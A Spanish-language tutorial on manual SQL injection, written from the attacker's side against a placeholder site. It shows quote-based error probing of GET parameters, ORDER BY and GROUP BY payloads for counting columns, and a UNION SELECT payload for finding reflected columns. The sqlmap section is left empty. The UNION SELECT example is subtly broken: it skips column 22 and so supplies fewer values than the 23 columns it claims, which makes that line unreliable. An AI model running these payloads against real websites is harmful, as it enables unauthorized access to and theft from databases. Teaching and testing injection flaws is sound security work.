# INYECCIÓN SQLi - Básico 

## TEMAS

* [¿Qué es una inyección sql?](#¿Qué-es-una-inyección-sql?)
* [¿Porqué ocurre un error sql?](#¿Porqué-ocurre-un-error-sql?)
* [Tipos de inyección sql](#Tipos-de-inyección-sql)
    * [Inyección sql manual](#Inyección-sql-manual)
      * [Detectar una página vulnerable](#Detectar-una-página-vulnerable)
      * [Detectar el número de columnas](#Detectar-el-número-de-columnas)
      * [Usando union select](#Usando-union-select)
    * [Inyección sql automatizada con sqlmap](#Inyección-sql-automatizada-con-sqlmap)


## ¿Qué es una inyección sql?

Sql Injection ó Inyección SQL es una vulnerabilidad que permite al atacante enviar o “inyectar” instrucciones SQL de forma maliciosa y malintencionada.

## ¿Porqué ocurre un error sql?

Un error SQL ocurre normalmente con la mala filtración de las variables en un programa que tiene o crea SQL, generalmente cuando solicitas a un usuario entradas de cualquier tipo y no se encuentran validadas, como por ejemplo su nombre y contraseña, pero a cambio de esta información el atacante envía una sentencia SQL invasora que se ejecutará en la base de datos.

## Tipos de inyección sql

Una inyección sql puede ser explotada de 2 maneras diferentes, manualmente, es decir, el atacante inyectara a mano la secuencia de comandos para así generar la acción dentro de la base de datos.

Por otra parte tenemos la inyección automatizada con sqlmap, sqlmap es una herramienta diseñada especialmente para este tipo de ataques, se encarga de analizar la página, ver si es vulnerable y atacar, se dice que es automatizada ya que la herramienta hace todo por si sola, el usuario solo necesita ingresar las opciones que quiera usar para hacer más efectivo el escaneo.

## Inyección sql manual 

### Detectar una página vulnerable

Una de las principales cosas en donde nos tenemos que fijar para detectar si una página es vulnerable a inyección sql es en sus parametros, imaginemos lo siguiente:

Encontramos una página común y corriente la cual utiliza muchos parametros por el metodo GET (recordemos que el metodo GET es cuando la página envia los datos usando la URL), entonces tenemos algo como esto:

`http://www.paginaparaejemplo.com/algo.php?id=1&id2=1&id3=1`

En este ejemplo tenemos 3 parametros, los cuales son:

```
id=1
id2=1
id3=1
```

Ahora, para detectar si la página es vulnerable, una de las cosas más sencillas es usar un simple ' al final de cada para metro para ver si nos genera un error en la base de datos. 

Entontes tenemos lo siguiente:

Agregamos un `'` al final del primer paramero, pero no nos genera ningun error:

`http://www.paginaparaejemplo.com/algo.php?id=1'&id2=1&id3=1`

Agregamos un `'` al final del segundo paramero, pero no nos genera ningun error:

`http://www.paginaparaejemplo.com/algo.php?id=1&id2=1'&id3=1`

Agregamos un `'` al final del ultimo paramero, pero aquí si nos devuelve un error:

`http://www.paginaparaejemplo.com/algo.php?id=1&id2=1&id3=1'`

La página nos muestra una leyenda como esta:

`You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax`

Ahora que tenemos el parámetro vulnerable, nos pasamos a lo siguiente.

### Detectar el número de columnas

Ya tenemos el parámetro vulnerable, ahora tenemos que identificar el número de columnas usadas por la página, para esto tenemos los siguientes comandos:

`ordey by` y `group by`

Aquí tenemos que ir testeando el numero de columnas, aquí un ejemplo de como usar el order by y el group by:

```
1' ORDER BY 1 --+	
1' ORDER BY 2 --+	
1' ORDER BY 3 --+	
1' ORDER BY 4 --+	
etc...
```
```
1' GROUP BY 1--+	
1' GROUP BY 2--+	
1' GROUP BY 3--+	
1' GROUP BY 4--+	
etc...
```

Aquí lo que estamos buscando es que la pagina nos genere un error al inyectar un numero que supera las columnas usadas por la página, para que sea un poco mas entendible vamos a verlo de esta manera:

Imaginamos que la pagina tiene `23` columnas, volviendo al ejemplo anterior en donde ya descubrimos el parámetro vulnerable nos quedaria algo como esto:


```

-http://www.paginaparaejemplo.com/algo.php?id=1&id2=1&id3=1' order by 1 --+ #sin error

-http://www.paginaparaejemplo.com/algo.php?id=1&id2=1&id3=1' order by 2 --+ #sin error

-http://www.paginaparaejemplo.com/algo.php?id=1&id2=1&id3=1' order by 3 --+ #sin error

-http://www.paginaparaejemplo.com/algo.php?id=1&id2=1&id3=1' order by 10 --+ #sin error

-http://www.paginaparaejemplo.com/algo.php?id=1&id2=1&id3=1' order by 20 --+ #sin error

-http://www.paginaparaejemplo.com/algo.php?id=1&id2=1&id3=1' order by 23 --+ #sin error

-http://www.paginaparaejemplo.com/algo.php?id=1&id2=1&id3=1' order by 24 --+ #tenemos un error

```

Al nosotros sobrepasar el número de columnas usadas por la página, esta nos mostrará un error como el siguiente: 

`La consulta no se realizo: Unknown column '24' in 'order clause'`

Gracias a esto, descubrimos que la página usa 23 columnas.

### Usando union select

Ahora llega el turno de `union select`, lo que hacen estos comandos es "darnos paso" por así decirlo a ejecutar sentencias directamente en la base de datos y que esto se vea reflejado en la página.

Para usar `union select`, tenos que poner el total de columnas que descubrimos anteriormente. Volviendo a el ejemplo que tenemos planteado, nos quedaría de la siguiente manera:

```
http://www.paginaparaejemplo.com/algo.php?id=1&id2=1&id3=1' union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,23 --+
```

Lo que eso generará es que la página nos muestre los números de las columnas que son vulnerables para inyectar en ellas, esta parte es muy importante ya que tenemos que ser muy curiosos para notar los cambios, en algunos casos los cambios son muy drásticos y se notan demasiado, pero en otros casos los cambios son demasiado sutiles.

Para este ejemplo, imaginemos que la página es vulnerable en las columnas `3` , `5` y `20`. La página nos mostrará estos números en algún lugar.









## Inyección sql automatizada con sqlmap



